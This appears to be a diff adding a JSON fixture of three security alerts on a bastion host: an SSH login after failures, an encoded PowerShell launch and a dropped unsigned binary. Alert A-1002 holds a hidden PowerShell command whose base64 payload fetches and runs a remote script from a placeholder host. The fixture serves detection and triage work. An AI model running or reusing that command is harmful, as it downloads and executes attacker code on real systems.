@@ -1,0 +1,48 @@
+[
+ {
+  "id": "A-1001",
+  "time": "2026-10-08T02:14:31Z",
+  "rule": "ssh_success_after_failures",
+  "severity": "medium",
+  "host": {
+   "name": "bastion",
+   "ip": "10.20.0.15"
+  },
+  "source": {
+   "ip": "203.0.113.7"
+  },
+  "user": {
+   "name": "svc_backup"
+  }
+ },
+ {
+  "id": "A-1002",
+  "time": "2026-10-08T02:15:05Z",
+  "rule": "encoded_powershell",
+  "severity": "high",
+  "host": {
+   "name": "bastion",
+   "ip": "10.20.0.15"
+  },
+  "process": {
+   "name": "powershell.exe",
+   "command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALgB1AHAAZABhAHQAZQAtAGMAaABlAGMAawAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA"
+  }
+ },
+ {
+  "id": "A-1003",
+  "time": "2026-10-08T02:15:12Z",
+  "rule": "unsigned_binary_written",
+  "severity": "high",
+  "host": {
+   "name": "bastion",
+   "ip": "10.20.0.15"
+  },
+  "file": {
+   "name": "dropper.bin",
+   "path": "C:\\Users\\svc_backup\\AppData\\Local\\Temp\\dropper.bin",
+   "sha256": "e0c3697b7761c11d4b237691006b983c30293f4d2197ba32c6de28178e426649",
+   "size": 600
+  }
+ }
+]
